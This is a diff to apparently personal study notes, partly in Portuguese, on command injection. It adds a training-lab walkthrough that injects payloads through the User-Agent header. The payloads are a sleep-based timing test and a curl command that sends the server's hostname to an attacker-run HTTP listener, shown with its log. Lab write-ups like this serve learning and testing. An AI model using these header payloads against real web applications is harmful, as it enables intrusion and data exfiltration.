@@ -40,6 +40,8 @@ Can cause service disruptions in the system. Results such as system crashes or s
 | powershell | Executes commands in Windows PowerShell.
 | timeout | Waits for a specified time.
 
+
+
 * Result-based command injection
 Result-based Command Injection is a vulnerability that occurs when an application executes operating system commands based on user input without proper validation
 
@@ -343,3 +345,23 @@ This lab contains a Command Injection vulnerability that leads to remote command
 The web application logs the User Agent information of visiting users in a log file. Find a way to execute commands on the system.
 
 What is the hostname address of the server where the website is running?
+
+: User-Agent: '; sleep 10'
+
+Este payload demonstrou que a aplicação realmente é vulnerável a command injection, pois a response demorou os 10 segundos para ser processada, para confirmar o teste pode subir para ~sleep 20~.
+
+Estratégia que tomei para pegar o hostname foi utilizar a Hackerbox do próprio lab, que esta conectada na mesma rede local que a apliação, facilitando o RCE
+
+: User-Agent: ';curl http://172.20.45.144:70/`hostname`'
+
+#+begin_src sh
+┌─[root@hackerbox]─[~]
+└──╼ #python3 -m http.server 70
+Serving HTTP on 0.0.0.0 port 70 (http://0.0.0.0:70/) ...
+172.20.45.177 - - [29/Sep/2025 12:51:57] code 404, message File not found
+172.20.45.177 - - [29/Sep/2025 12:51:57] "GET /arcane HTTP/1.1" 404 -
+172.20.45.177 - - [29/Sep/2025 12:52:07] code 404, message File not found
+172.20.45.177 - - [29/Sep/2025 12:52:07] "GET /arcane HTTP/1.1" 404 -
+#+end_src
+
+THe server hostname is *arcane*
